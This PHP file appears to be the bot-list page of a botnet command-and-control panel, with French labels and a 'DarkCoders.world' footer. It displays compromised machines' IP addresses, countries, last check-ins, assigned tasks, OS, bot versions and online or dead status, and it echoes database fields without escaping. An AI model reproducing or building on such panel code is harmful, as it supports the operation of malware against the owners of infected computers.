<?php
include_once("./includes/header.php"); 
?>
<main>
        <div class="container">
                       <h1 class="thin">Bots</h1>

            <div id="dashboard">
				<div class="row">
						<table id="botlist" class="table table-condensed table-hover table-striped table-bordered">
							<thead>
								<tr>
									<th>#</th>
									<th>Adresse IP</th>
									<th>Pays</th>
									<th>Dernière connexion</th>
									<th>Tâche</th>
									<th>Système d'exploitation</th>
									<th>Version Bot</th>
									<th>Marque</th>
									<th>Status</th>
								</tr>
							</thead>
							<tbody>
								<?php
								$bots = $odb->query("SELECT * FROM bots ORDER BY lastresponse DESC");
								$unix = $odb->query("SELECT UNIX_TIMESTAMP()")->fetchColumn(0);
								while ($b = $bots->fetch(PDO::FETCH_ASSOC))
								{
									$id = $b['id'];
									$ip = $b['ipaddress'];
									$cn = geoip_country_name_by_id($gi, $b['country']);
									$fl = strtolower(geoip_country_code_by_id($gi, $b['country']));
									$lrd = $b['lastresponse'];
									$lr = date("m-d-Y, h:i A", $lrd);
									$ct = $b['currenttask'];
									$os = $b['operatingsys'];
									$bv = $b['botversion'];
									$st = "";
									$mk = "";
									if (($lrd + ($knock + 120)) > $unix)
									{
										$st = '<small class="badge bg-green">En ligne</small>';
									}else{
										if ($lrd + $deadi < $unix)
										{
											$st = '<small class="badge bg-red">Dead</small>';
										}else{
											$st = '<small class="badge bg-yellow">Hors- ligne</small>';
										}
									}
									if ($b['mark'] == "1")
									{
										$mk = '<small class="badge bg-green">Clean</small>';
									}else{
										$mk = '<small class="badge bg-red">Dirty</small>';
									}
									echo '<tr><td>'.$id.'</td><td><a id="details" data-toggle="tooltip" title="View All Details" href="?p=details&id='.$id.'">'.$ip.'</a></td><td>'.$cn.'&nbsp;&nbsp;<img src="assets/images/flags/'.$fl.'.png" /></td><td data-order="'.$lrd.'">'.$lr.'</td><td>#'.$ct.'</td><td>'.$os.'</td><td>'.$bv.'</td><td><center>'.$mk.'</center></td><td><center>'.$st.'</center></td></tr>';
								}
								?>
							</tbody>
						</table>
				</div>	
			
	</div>
	<script src="assets/js/jquery.min.js" type="text/javascript"></script>
	<script src="assets/js/jquery.dataTables.js" type="text/javascript"></script>
	<script src="assets/js/dataTables.bootstrap.js" type="text/javascript"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$("#botlist").dataTable({
				"order": [[ 3, "desc" ]],
				"iDisplayLength": 25,
				"aLengthMenu": [[10, 25, 50, 100, -1], [10, 25, 50, 100, "All"]],
				"oLanguage": {
					"sEmptyTable": "No data to display"
				}
			});
		});
	</script>
    
    </main>
<footer class="page-footer grey lighten-3 z-depth-2">
		<div class="footer-copyright grey-text text-darken-3 center-align">
			<div class="container">&copy; 2018 DarkCoders.world</div>
		</div>
	</footer>